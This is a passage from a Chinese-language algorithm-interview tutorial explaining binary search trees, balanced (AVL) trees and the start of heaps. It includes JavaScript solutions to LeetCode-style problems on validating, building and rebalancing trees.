（关于二叉树平衡度的知识，我们会在下一节作讲解，大家稍安勿躁）</p>
<h2 data-id="heading-78">二叉搜索树的特性</h2>
<p>关于二叉搜索树的特性，有且仅有一条是需要大家背诵默写的：<br/>
<strong>二叉搜索树的中序遍历序列是有序的</strong>！</p>
<p>OK，基本功就修炼到这里，下面大家一起来开开心心地碾碎真题吧！</p>
<h2 data-id="heading-79">真题实战环节</h2>
<p>开篇我们说过，我们只要能够把握好二叉搜索树的限制条件（即定义）和特性，就足以应对大部分的考题。下面我们就来看看定义和特性的考察是如何在真题中体现的：</p>
<h3 data-id="heading-80">对定义的考察：二叉搜索树的验证</h3>
<blockquote>
<p>题目描述：给定一个二叉树，判断其是否是一个有效的二叉搜索树。<br/>
假设一个二叉搜索树具有如下特征：<br/>
节点的左子树只包含小于当前节点的数。<br/>
节点的右子树只包含大于当前节点的数。<br/>
所有左子树和右子树自身必须也是二叉搜索树。</p>
</blockquote>
<blockquote>
<p>示例 1:<br/>
输入:</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">    2
   / \
  1   3
</span></code></pre>
<blockquote>
<p>输出: true</p>
</blockquote>
<blockquote>
<p>示例 2:<br/>
输入:</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">    5
   / \
  1   4
     / \
    3   6
</span></code></pre>
<blockquote>
<p>输出: false<br/>
解释: 输入为: [5,1,4,null,null,3,6]。<br/>
根节点的值为 5 ，但是其右子节点值为 4 。</p>
</blockquote>
<h4 data-id="heading-81">思路分析</h4>
<p>对于这道题，我们需要好好咀嚼一下二叉搜索树的定义：</p>
<ol>
<li>它可以是一棵空树</li>
<li>它可以是一棵由根结点、左子树、右子树组成的树，同时左子树和右子树都是二叉搜索树，且<strong>左子树</strong>上所有结点的数据域都<strong>小于等于</strong>根结点的数据域，<strong>右子树</strong>上所有结点的数据域都<strong>大于等于</strong>根结点的数据域</li>
</ol>
<p>只有符合以上两种情况之一的二叉树，可以称之为二叉搜索树。<br/>
空树的判定比较简单，关键在于非空树的判定：需要递归地对非空树中的左右子树进行遍历，检验每棵子树中是否都满足 <code>左 &lt; 根 &lt; 右</code> 这样的关系（注意题中声明了不需要考虑相等情况）。<br/>
基于这样的思路，我们可以编码如下：</p>
<h4 data-id="heading-82">编码实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">boolean</span>}
 */</span>
<span class="hljs-keyword">const</span> isValidBST = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-comment">// 定义递归函数</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">root, minValue, maxValue</span>) {
      <span class="hljs-comment">// 若是空树，则合法</span>
      <span class="hljs-keyword">if</span>(!root) {
          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
      }
      <span class="hljs-comment">// 若右孩子不大于根结点值，或者左孩子不小于根结点值，则不合法</span>
      <span class="hljs-keyword">if</span>(root.<span class="hljs-property">val</span> &lt;= minValue || root.<span class="hljs-property">val</span> &gt;= maxValue) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
      <span class="hljs-comment">// 左右子树必须都符合二叉搜索树的数据域大小关系</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">dfs</span>(root.<span class="hljs-property">left</span>, minValue,root.<span class="hljs-property">val</span>) &amp;&amp; <span class="hljs-title function_">dfs</span>(root.<span class="hljs-property">right</span>, root.<span class="hljs-property">val</span>, maxValue)
  }
  <span class="hljs-comment">// 初始化最小值和最大值为极小或极大</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">dfs</span>(root, -<span class="hljs-title class_">Infinity</span>, <span class="hljs-title class_">Infinity</span>)
};
</code></pre>
<h4 data-id="heading-83">编码复盘</h4>
<p>这个题的编码实现比较有意思，对 <code>minValue</code> 和 <code>maxValue</code> 的处理值得我们反刍一下：</p>
<p>递归过程中，起到决定性作用的是这两个判定条件：</p>
<ul>
<li>左孩子的值是否小于根结点值</li>
<li>右孩子的值是否大于根结点值</li>
</ul>
<p>在递归式中，如果单独维护一段逻辑，用于判定当前是左孩子还是右孩子，进而决定是进行大于判定还是小于判定，也是没问题的。但是在上面的编码中我们采取了一种更简洁的手法，通过设置 <code>minValue</code> 和 <code>maxValue</code> 为极小和极大值，来确保 <code>root.val &lt;= minValue || root.val &gt;= maxValue</code> 这两个条件中有一个是一定为 <code>false</code> 的。</p>
<p>比如当前我需要检查的是<code>root</code> 的左孩子，那么就会进入 <code>dfs(root.left, minValue,root.val)</code> 这段逻辑。这个<code>dfs</code>调用将最大值更新为了<code>root</code>根结点的值，将当前<code>root</code>结点更新为了左孩子结点，同时保持最小值为 <code>-Infinity</code> 不变。进入 <code>dfs</code>逻辑后，<code>root.val &lt;= minValue || root.val &gt;= maxValue</code> 中的 <code>root.val &lt;= minValue</code> 一定为 <code>false</code> ，起决定性作用的条件实际是 <code>root.val &gt;= maxValue</code>（这里这个 <code>maxValue</code> 正是根结点的数据域值)。若<code>root.val &gt;= maxValue</code>返回 <code>true</code>，就意味着左孩子的值大于等于（也就是不小于）根结点的数据域值，这显然是不合法的。此时整个或语句都会返回<code>true</code>，递归式返回<code>false</code>，二叉搜索树进而会被判定为不合法。</p>
<h3 data-id="heading-84">对特性的考察：将排序数组转化为二叉搜索树</h3>
<blockquote>
<p>题目描述：将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。<br/>
本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p>
</blockquote>
<blockquote>
<p>示例:
给定有序数组: [-10,-3,0,5,9],<br/>
一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">      0
     / \
   -3   9
   /   /
 -10  5
</span></code></pre>
<h4 data-id="heading-85">思路分析</h4>
<p>这道题出现在这个位置真是太棒了（陶醉脸），它不仅是一道典型的二叉搜索树应用题，还涉及到了平衡二叉树的基本知识，对下一个专题的学习起到了很好的铺垫作用。</p>
<p>做这个题，大家可以先观察一下它的输入和输出，你会发现它们之间有着很微妙的关系。先看输入：</p>
<pre><code class="hljs language-js" lang="js">[-<span class="hljs-number">10</span>,-<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>]
</code></pre>
<p>再看输出：</p>
<pre><code class="hljs language-js" lang="js">      <span class="hljs-number">0</span>
     / \
   -<span class="hljs-number">3</span>   <span class="hljs-number">9</span>
   /   /
 -<span class="hljs-number">10</span>  <span class="hljs-number">5</span>
</code></pre>
<p>这个二叉树从形状上来看，像不像是把数组从 <code>0</code> 这个中间位置给“提起来”了？<br/>
别笑，我们接下来要做的事情，还真就是要想办法把这个数组给“提”成二叉树。</p>
<p>在想办法之前，我们先来反思一下为什么可以通过“提起来”来实现数组到目标二叉树的转换，这里面蕴含了两个依据：</p>
<ol>
<li>
<p>二叉搜索树的特性：题目中指明了目标树是一棵二叉搜索树，二叉搜索树的中序遍历序列是有序的，题中所给的数组也是有序的，<strong>因此我们可以认为题目中给出的数组就是目标二叉树的中序遍历序列</strong>。中序遍历序列的顺序规则是 <code>左 -&gt; 根 -&gt; 右</code>，因此数组中间位置的元素一定对应着目标二叉树的根结点。以根结点为抓手，把这个数组“拎”起来，得到的二叉树一定是符合二叉搜索树的排序规则的。</p>
</li>
<li>
<p>平衡二叉树的特性：虽然咱们还没有讲啥是平衡二叉树，但是题目中已经妥妥地给出了一个平衡二叉树的定义：</p>
</li>
</ol>
<blockquote>
<p>一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p>
</blockquote>
<p>要做到这一点，只需要把“提起来”这个动作贯彻到底就行了：当我们以有序数组的中间元素为根结点，“提”出一个二叉树时，有两种可能的情况：</p>
<ol>
<li>数组中元素为奇数个，此时以数组的中间元素为界，两侧元素个数相同：</li>
</ol>
<pre><code class="hljs language-js" lang="js">[-<span class="hljs-number">10</span>,-<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>]
</code></pre>
<p>如果我们以中间元素为根结点，把数组“提”成二叉树，那么根结点左右两侧的元素个数是一样的，所以站在根结点来看，左右子树的高度差为0：</p>
<pre><code class="hljs language-js" lang="js">      <span class="hljs-number">0</span>
     / \
   -<span class="hljs-number">3</span>   <span class="hljs-number">9</span>
   /   /
 -<span class="hljs-number">10</span>  <span class="hljs-number">5</span>
</code></pre>
<ol start="2">
<li>数组中元素为偶数个，此时无论是选择中间靠左的元素为界、还是选择中间靠右的元素为界，两侧元素个数差值的绝对值都是1：</li>
</ol>
<pre><code class="hljs language-js" lang="js">[-<span class="hljs-number">10</span>,-<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>]
</code></pre>
<p>在这个例子里，若以 -3 为根结点，那么左右子树的高度差的绝对值就是1：</p>
<pre><code class="hljs language-js" lang="js">      -<span class="hljs-number">3</span>
     / \
   -<span class="hljs-number">10</span>   <span class="hljs-number">0</span>
          \
           <span class="hljs-number">5</span>
</code></pre>
<p>以 0 为根结点亦然。</p>
<p>通过对以上情况进行探讨，我们发现“以中间元素为根结点，将数组提成树”这种操作，可以保证根结点左右两侧的子树高度绝对值不大于1。要想保证每一棵子树都满足这个条件，我们只需要对有序数组的每一个对半分出来的子序列都递归地执行这个操作即可。</p>
<h4 data-id="heading-86">编码实现</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>}
 */</span>
<span class="hljs-keyword">const</span> sortedArrayToBST = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) {
    <span class="hljs-comment">// 处理边界条件</span>
    <span class="hljs-keyword">if</span>(!nums.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// root 结点是递归“提”起数组的结果</span>
    <span class="hljs-keyword">const</span> root = <span class="hljs-title function_">buildBST</span>(<span class="hljs-number">0</span>, nums.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>)

    <span class="hljs-comment">// 定义二叉树构建函数，入参是子序列的索引范围</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">buildBST</span>(<span class="hljs-params">low, high</span>) {
        <span class="hljs-comment">// 当 low &gt; high 时，意味着当前范围的数字已经被递归处理完全了</span>
        <span class="hljs-keyword">if</span>(low &gt; high) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
        }
        <span class="hljs-comment">// 二分一下，取出当前子序列的中间元素</span>
        <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(low + (high - low)/<span class="hljs-number">2</span>)  
        <span class="hljs-comment">// 将中间元素的值作为当前子树的根结点值</span>
        <span class="hljs-keyword">const</span> cur = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(nums[mid]) 
        <span class="hljs-comment">// 递归构建左子树，范围二分为[low,mid)</span>
        cur.<span class="hljs-property">left</span> = <span class="hljs-title function_">buildBST</span>(low,mid-<span class="hljs-number">1</span>)
        <span class="hljs-comment">// 递归构建左子树，范围二分为为(mid,high]</span>
        cur.<span class="hljs-property">right</span> = <span class="hljs-title function_">buildBST</span>(mid+<span class="hljs-number">1</span>, high)
        <span class="hljs-comment">// 返回当前结点</span>
        <span class="hljs-keyword">return</span> cur
    }
    <span class="hljs-comment">// 返回根结点</span>
    <span class="hljs-keyword">return</span> root
};
</code></pre>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）
二叉搜索树是二叉树的特例，平衡二叉树则是二叉搜索树的特例。</p>
<h2 data-id="heading-87">什么是平衡二叉树</h2>
<p>在上一节的末尾，我们已经通过一道真题和平衡二叉树打过交道。正如题目中所说，平衡二叉树（又称 AVL Tree）指的<strong>是任意结点</strong>的<strong>左右子树高度差绝对值都不大于1</strong>的二叉<strong>搜索树</strong>。</p>
<h2 data-id="heading-88">为什么要有平衡二叉树</h2>
<p>平衡二叉树的出现，是为了降低二叉搜索树的查找时间复杂度。<br/>
大家知道，对于同样一个遍历序列，二叉搜索树的造型可以有很多种。拿 <code>[1,2,3,4,5]</code>这个中序遍历序列来说，基于它可以构造出的二叉搜索树就包括以下两种造型：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/24/17245d06f50d1e9f~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=944&amp;h=756&amp;s=46240&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/24/17245d2227c126fc~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=918&amp;h=950&amp;s=42843&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/>
结合平衡二叉树的定义，我们可以看出，第一棵二叉树是平衡二叉树，第二棵二叉树是普通的二叉搜索树。<br/>
现在，如果要你基于上一节学过的二叉搜索树查找算法，在图上两棵树上分别找出值为1的结点，问你各需要查找几次？在1号二叉树中，包括根结点在内，只需要查找3次；而在2号二叉树中，包括根结点在内，一共需要查找5次。</p>
<p>我们发现，在这个例子里，对于同一个遍历序列来说，平衡二叉树比非平衡二叉树（图上的结构可以称为链式二叉树）的查找效率更高。这是为什么呢？</p>
<p>大家可以仔细想想，为什么科学家们会无中生有，给二叉树的左右子树和根结点之间强加上排序关系作为约束，进而创造出二叉搜索树这种东西呢？难道只是为了装x吗？当然不是啦。<strong>二叉搜索树的妙处就在于它把“二分”这种思想以数据结构的形式表达了出来</strong>。在一个构造合理的二叉搜索树里，我们可以通过对比当前结点和目标值之间的大小关系，缩小下一步的搜索范围（比如只搜索左子树或者只搜索右子树），进而规避掉不必要的查找步骤，降低搜索过程的时间复杂度。但是如果一个二叉搜索树严重不平衡，比如说上面这棵链式搜索树：<br/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/24/17245d2227c126fc~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=918&amp;h=950&amp;s=42843&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p>每一个结点的右子树都是空的，这样的结构非常不合理，它会带来高达O(N)的时间复杂度。而平衡二叉树由于利用了二分思想，查找操作的时间复杂度仅为 O(logN)。因此，为了保证二叉搜索树能够确实为查找操作带来效率上的提升，我们有必要在构造二叉搜索树的过程中维持其平衡度，这就是平衡二叉树的来由。</p>
<h2 data-id="heading-89">命题思路解读</h2>
<p>平衡二叉树和二叉搜索树一样，都被归类为“特殊”的二叉树。对于这样的数据结构来说，其“特殊”之处也正是其考点所在，因此真题往往稳定地分布在以下两个方向：</p>
<ul>
<li>
<p>对特性的考察（本节以平衡二叉树的判定为例）</p>
</li>
<li>
<p>对操作的考察（本节以平衡二叉树的构造为例）</p>
</li>
</ul>
<h2 data-id="heading-90">平衡二叉树的判定</h2>
<blockquote>
<p>题目描述：给定一个二叉树，判断它是否是高度平衡的二叉树。<br/>
本题中，一棵高度平衡二叉树定义为：
一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。</p>
</blockquote>
<blockquote>
<p>示例 1:
给定二叉树 [3,9,20,null,null,15,7]</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">    3
   / \
  9  20
    /  \
   15   7
</span></code></pre>
<blockquote>
<p>返回 true 。</p>
</blockquote>
<blockquote>
<p>示例 2:
给定二叉树 [1,2,2,3,3,null,null,4,4]</p>
</blockquote>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">       1
      / \
     2   2
    / \
   3   3
  / \
 4   4
</span></code></pre>
<blockquote>
<p>返回 false 。</p>
</blockquote>
<h3 data-id="heading-91">思路分析</h3>
<p>来，我们复习一遍平衡二叉树的定义：</p>
<blockquote>
<p>平衡二叉树<strong>是任意结点</strong>的<strong>左右子树高度差绝对值都不大于1</strong>的二叉<strong>搜索树</strong>。
抓住其中的三个关键字：</p>
</blockquote>
<ol>
<li>任意结点</li>
<li>左右子树高度差绝对值都不大于1</li>
<li>二叉搜索树</li>
</ol>
<p>注意，结合题意，上面3个关键字中的3对这道题来说是不适用的，因此我们不必对二叉搜索树的性质进行校验。现在只看 1 和 2，先给自己一分钟思考一下——你可以提取出什么线索？</p>
<p>“任意结点”什么意思？每一个结点都需要符合某个条件，也就是说每一个结点在被遍历到的时候都需要重复某个校验流程，对不对？<br/>
哎，我刚刚是不是说了什么不得了的动词了？啊，是<strong>重复</strong>！是tmd的<strong>重复啊</strong>！！！来，学到了第18节，为了向我证明你没有跳读，请大声喊出下面这两个字：</p>
<p> 递归！</p>
没错，“任意结点”这四个字，就是在暗示你用递归。而“左右子树高度差绝对值都不大于1”这个校验规则，就是递归式。   
<p>啊，真让人激动呢，解决这道题的思路竟然已经慢慢浮现出来了，那就是：从下往上递归遍历树中的每一个结点，计算其左右子树的高度并进行对比，只要有一个高度差的绝对值大于1，那么整棵树都会被判为不平衡。</p>
<h3 data-id="heading-92">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> isBalanced = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
  <span class="hljs-comment">// 立一个flag，只要有一个高度差绝对值大于1，这个flag就会被置为false</span>
  <span class="hljs-keyword">let</span> flag = <span class="hljs-literal">true</span>
  <span class="hljs-comment">// 定义递归逻辑</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">root</span>) {
      <span class="hljs-comment">// 如果是空树，高度记为0；如果flag已经false了，那么就没必要往下走了，直接return</span>
      <span class="hljs-keyword">if</span>(!root || !flag) {
          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> 
      }
      <span class="hljs-comment">// 计算左子树的高度</span>
      <span class="hljs-keyword">const</span> left = <span class="hljs-title function_">dfs</span>(root.<span class="hljs-property">left</span>)  
      <span class="hljs-comment">// 计算右子树的高度</span>
      <span class="hljs-keyword">const</span> right = <span class="hljs-title function_">dfs</span>(root.<span class="hljs-property">right</span>)  
      <span class="hljs-comment">// 如果左右子树的高度差绝对值大于1，flag就破功了</span>
      <span class="hljs-keyword">if</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(left-right) &gt; <span class="hljs-number">1</span>) {
          flag = <span class="hljs-literal">false</span>
          <span class="hljs-comment">// 后面再发生什么已经不重要了，返回一个不影响回溯计算的值</span>
          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
      }
      <span class="hljs-comment">// 返回当前子树的高度</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(left, right) + <span class="hljs-number">1</span>
  }
  
  <span class="hljs-comment">// 递归入口</span>
  <span class="hljs-title function_">dfs</span>(root) 
  <span class="hljs-comment">// 返回flag的值</span>
  <span class="hljs-keyword">return</span> flag
};
</code></pre>
<h2 data-id="heading-93">平衡二叉树的构造</h2>
<blockquote>
<p>题目描述：给你一棵二叉搜索树，请你返回一棵平衡后的二叉搜索树，新生成的树应该与原来的树有着相同的节点值。<br/>
如果一棵二叉搜索树中，每个节点的两棵子树高度差不超过 1 ，我们就称这棵二叉搜索树是平衡的。<br/>
如果有多种构造方法，请你返回任意一种。</p>
</blockquote>
<blockquote>
<p>示例：</p>
</blockquote>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/4/171e046bc8287d8b~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=375&amp;h=372&amp;s=9905&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/4/171e046d9a086675~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=235&amp;h=279&amp;s=7861&amp;e=png" alt="" loading="lazy"/></p>
<blockquote>
<p>输入：root = [1,null,2,null,3,null,4,null,null]<br/>
输出：[2,1,3,null,null,null,4]<br/>
解释：这不是唯一的正确答案，[3,1,4,null,2,null,null] 也是一个可行的构造方案。<br/>
</p>
</blockquote>
<blockquote>
<p>提示：<br/>
树节点的数目在 1 到 10^4 之间。
树节点的值互不相同，且在 1 到 10^5 之间。</p>
</blockquote>
<h3 data-id="heading-94">思路分析</h3>
<p>这道题乍一看有点唬人，可能会直接干懵一部分同学。不过不用慌——题目再新，套路依旧。只要你对核心考点把握得足够扎实，它就难不倒你。</p>
<p>我们来分析一下这道题的核心诉求：要求我们构造一棵平衡的二叉搜索树。先抛开题干中各种前置条件不谈，单看这个输出结果，你会不会有一种似曾相识的感觉呢？没错，在上一节的最后一道真题中，我们也构造过这样的一棵二叉树。</p>
<p>那么这两道题之间会不会有什么微妙的联系呢？答案是会，不然，笔者也不会把它们放得这么近（疯狂暗示）。两道题之间唯一的差别在于输入：在我们已经做过的那道题中，输入参数是一个有序数组；而这道题中，输入参数是一个二叉搜索树。</p>
<p>唔，再想想！上一节那道题里的“有序数组”，和眼前这道题里的“二叉搜索树”之间，会不会有什么妙不可言的关系呢？</p>
<p>别忘了，<strong>二叉搜索树的中序遍历序列是有序的</strong>！所谓有序数组，完全可以理解为二叉搜索树的中序遍历序列啊，对不对？现在树都给到咱们手里了，求它的中序遍历序列是不是非常 easy？如果能把中序遍历序列求出来，这道题是不是就跟之前做过那道是一模一样的解法了？</p>
<p>没错，这道题的解题思路正是：</p>
<ol>
<li>中序遍历求出有序数组</li>
<li>逐个将二分出来的数组子序列“提”起来变成二叉搜索树</li>
</ol>
<h3 data-id="heading-95">编码实现</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">TreeNode</span>} <span class="hljs-variable">root</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">TreeNode</span>}
 */</span>
<span class="hljs-keyword">const</span> balanceBST = <span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-comment">// 初始化中序遍历序列数组</span>
    <span class="hljs-keyword">const</span> nums = []
    <span class="hljs-comment">// 定义中序遍历二叉树，得到有序数组</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">inorder</span>(<span class="hljs-params">root</span>) {
        <span class="hljs-keyword">if</span>(!root) {
            <span class="hljs-keyword">return</span> 
        }
        <span class="hljs-title function_">inorder</span>(root.<span class="hljs-property">left</span>)  
        nums.<span class="hljs-title function_">push</span>(root.<span class="hljs-property">val</span>)  
        <span class="hljs-title function_">inorder</span>(root.<span class="hljs-property">right</span>)
    }
    
    <span class="hljs-comment">// 这坨代码的逻辑和上一节最后一题的代码一模一样</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">buildAVL</span>(<span class="hljs-params">low, high</span>) {
        <span class="hljs-comment">// 若 low &gt; high，则越界，说明当前索引范围对应的子树已经构建完毕</span>
        <span class="hljs-keyword">if</span>(low&gt;high) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
        }
        <span class="hljs-comment">// 取数组的中间值作为根结点值</span>
        <span class="hljs-keyword">const</span> mid = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(low + (high -low)/<span class="hljs-number">2</span>)
        <span class="hljs-comment">// 创造当前树的根结点</span>
        <span class="hljs-keyword">const</span> cur = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(nums[mid])  
        <span class="hljs-comment">// 构建左子树</span>
        cur.<span class="hljs-property">left</span> = <span class="hljs-title function_">buildAVL</span>(low, mid-<span class="hljs-number">1</span>) 
        <span class="hljs-comment">// 构建右子树</span>
        cur.<span class="hljs-property">right</span> = <span class="hljs-title function_">buildAVL</span>(mid+<span class="hljs-number">1</span>, high)  
        <span class="hljs-comment">// 返回当前树的根结点 </span>
        <span class="hljs-keyword">return</span> cur
    }
    <span class="hljs-comment">// 调用中序遍历方法，求出 nums</span>
    <span class="hljs-title function_">inorder</span>(root)
    <span class="hljs-comment">// 基于 nums，构造平衡二叉树</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">buildAVL</span>(<span class="hljs-number">0</span>, nums.<span class="hljs-property">length</span>-<span class="hljs-number">1</span>)
};
</code></pre>
<p>本节内容不要求所有同学掌握——如果你在阅读的过程中，觉得理解起来非常吃力，笔者建议你暂时跳过这一节，优先完成全盘的知识点扫盲后再回来看。</p>
<p>为什么这样说？这里面有两个原因：</p>
<ol>
<li>根据笔者长期奋战算法面试一线的经验，能用堆结构解决的问题，基本上也都能用普通排序来解决。</li>
<li>即便是后端工程师或者算法工程师，能够在面试现场手写堆结构的人也寥寥无几。这倒不是因为他们不够专业，而是因为他们基本都非常熟悉一门叫做 <code>JAVA</code> 的语言——<code>JAVA</code>大法好，它在底层封装了一个叫做priorty_queue的数据结构，这个数据结构把堆的构建、插入、删除等操作全部做掉了。所以说这帮人非常喜欢做堆/优先队列相关的题目，调几个<code>API</code>就完事儿了。</li>
</ol>
<p>那么为什么还要讲堆结构，堆结构在我们整个知识体系里的定位应该怎么去把握，这里有两件事情希望大家能明白：</p>
<ol>
<li>
<p>几乎每一本正经的计算机专业数据结构教材，都会介绍堆结构。小册本身虽然是面向面试的，但笔者更希望能借这个机会，帮助一部分没有机会接受科班教育的前端同行补齐自身的知识短板。</p>
</li>
<li>
<p>笔者个人在素材调研期间经历过的 <code>N</code> 次涉及算法的前端面试中，有1次真的考到了需要用堆结构解决的问题（这道题在下面的讲解中也会出现）。当时笔者还不知道堆的玩法，直接用<code>JS</code>的排序<code>API</code>做出来了。事后和面试官聊天的时候，突然被他要求用堆结构再做一遍。最后虽然在没写出来的情况下拿到了<code>offer</code>，但事后想起来，还是非常后怕——没有人能预知自己下一次遇到的面试官到底是什么脾气，我们只能尽自己所能地去做万全的准备。</p>
</li>
</ol>
<h2 data-id="heading-96">前置知识：完全二叉树</h2>
<p>完全二叉树是指同时满足下面两个条件的二叉树：</p>
<ol>
<li>从第一层到倒数第二层，每一层都是满的，也就是说每一层的结点数都达到了当前层所能达到的最大值</li>
<li>最后一层的结点是从左到右连续排列的，不存在跳跃排列的情况（也就是说这一层的所有结点都集中排列在最左边）。</li>
</ol>
<p>完全二叉树可以是这样的：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b51adec191fc~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1218&amp;h=1078&amp;s=73714&amp;e=jpg" alt="" loading="lazy"/>
也可以是这样的：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b53f668d2a89~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=802&amp;h=894&amp;s=53727&amp;e=png" alt="" loading="lazy"/></p>
<p>但不能是这样的：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b5699b3d67bb~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1204&amp;h=948&amp;s=60229&amp;e=jpg" alt="" loading="lazy"/></p>
<p>更不能是这样的：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b574e26782a3~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1198&amp;h=1176&amp;s=49307&amp;e=jpg" alt="" loading="lazy"/></p>
<p>注意，完全二叉树中有着这样的索引规律：假如我们从左到右、从上到下依次对完全二叉树中的结点从0开始进行编码：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b59096075d9e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=998&amp;h=816&amp;s=51724&amp;e=png" alt="" loading="lazy"/>
那么对于索引为 <code>n</code> 的结点来说：</p>
<ol>
<li>索引为 <code>(n-1)/2</code> 的结点是它的父结点</li>
<li>索引<code> 2*n+1</code> 的结点是它的左孩子结点</li>
<li>索为引<code> 2*n+2</code> 的结点是它的右孩子结点</li>
</ol>
<h2 data-id="heading-97">什么是堆</h2>
<p>堆是<strong>完全二叉树</strong>的一种特例。根据约束规则的不同，堆又分为两种：</p>
<ol>
<li>大顶堆</li>
<li>小顶堆</li>
</ol>
<p>如果对一棵完全二叉树来说，它每个结点的结点值都不小于其左右孩子的结点值，这样的完全二叉树就叫做“大顶堆”：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/31/1726b5a74a28f22e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=680&amp;h=484&amp;s=26764&amp;e=png" alt="" loading="lazy"/>
若树中每个结点值都不大于其左右孩子的结点值，这样的完全二叉树就叫做“小顶堆”</p>
